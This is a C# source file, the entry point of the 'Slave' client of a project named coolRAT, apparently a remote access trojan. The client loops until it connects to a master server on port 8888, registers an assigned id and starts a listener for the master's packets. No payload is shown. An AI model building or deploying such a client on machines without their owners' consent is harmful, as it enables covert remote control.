using coolRAT.Libs;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace coolRAT.Slave
{
    class Program
    {
        static void Main(string[] args)
        {
            MasterFinder.RunInit(new ConnectionSettings(8888));
            Console.WriteLine("-- Master Finder running");
            while (true)
            {
                MasterServerInfo inf = MasterFinder.ConnectToMasterServer();
                if (inf.HasValues)
                {
                    SlaveGlobalData.MasterServerInfo = inf;
                    SlaveGlobalData.LocalClient = inf.LocalClient;
                    SlaveGlobalData.MainListenerLoop = new PacketListenerLoop(inf.MainConnection, new Slave_PacketHandler(inf.MainConnection));
                    Console.WriteLine("Authentication complete.");
                    Console.WriteLine($"Assigned Id: {inf.LocalClient.UniqueId}");
                    Task.Run(() => SlaveGlobalData.MainListenerLoop.Run());
                    Console.WriteLine($"PacketHandler of type {SlaveGlobalData.MainListenerLoop.Handler.GetType().ToString()} has been assigned to the main connection");
                    break;
                }
            }
            


            Console.WriteLine("Connected to the master server!");
            Console.ReadLine();
        }
    }
}
